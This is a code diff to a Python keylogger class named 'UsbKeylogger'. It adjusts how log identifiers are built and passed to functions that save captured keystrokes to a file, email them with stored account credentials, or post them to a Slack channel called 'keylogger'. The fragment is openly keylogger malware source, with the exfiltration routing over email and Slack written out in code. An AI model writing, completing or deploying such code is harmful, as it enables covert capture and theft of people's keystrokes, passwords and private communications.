@@ -7,8 +7,8 @@ from datetime import datetime # Imported to retrieve the current date times at c
 from email import message # Imported to format emails for sending keylohs
 
 from asyncio.windows_events import NULL
-from slack_sdk import WebClient # Permits the use of Slack
-from dotenv import load_dotenv
+from slack_sdk import WebClient # Imported to use Slack development
+from dotenv import load_dotenv # Imported to use .env
 import os
 
 load_dotenv() # Loads environment to use variable in .env
@@ -34,6 +34,11 @@ class UsbKeylogger:
         startTime = str(self.startTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the start time of the keylog interval
         endTime = str(self.endTimeVal).replace(":", "-").replace(" ", "_") # Creates a string variable from the end time of the keylog interval
         self.fileIndentifier = f"Log = {startTime} to {endTime}" # Sets the file name to "Log start time to end time"
+
+    def createID(self):
+        startTime = str(self.startTimeVal).replace(" ", "_") # Creates a string variable from the start time of the keylog interval
+        endTime = str(self.endTimeVal).replace(" ", "_") # Creates a string variable from the end time of the keylog interval
+        self.identifier = f"Log: {startTime} to {endTime}" # Sets the file name to "Log start time to end time"
 
     def reportFile(self):
         with open(f"{self.fileIndentifier}.txt", "w") as f: # Opens a file of the name from createFileIdentifier
@@ -77,13 +82,14 @@ class UsbKeylogger:
         if self.keylog: # Checks if self.keylong contains any data and execute the below statements if it does
             self.endTimeVal = datetime.now() # Retrieves the end datetime for utilization in file identifying
             self.createFileIdentifier() # Execute the function that creates the file id/name
+            self.createID() # Execute the function createId for report types other than file
 
             if self.reportType == "File":
                 self.reportFile() # Calls the reportFile function to create a file for keylog recording
             elif self.reportType == "Email":
-                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.fileIndentifier) # Calls the reportEmail function to sends an email of keylog recording
+                self.reportEmail(EMAIL, EMAIL_PW, self.keylog, self.identifier) # Calls the reportEmail function to sends an email of keylog recording
             elif self.reportType == "Slack":
-                self.reportSlack(self.fileIndentifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
+                self.reportSlack(self.identifier) # Calls the reportSlack function to send keylogs as a slack message in a "keylogger" channel
 
             self.startTimeVal = datetime.now() # Retrieves the start datetime for utilization in file identifying
         
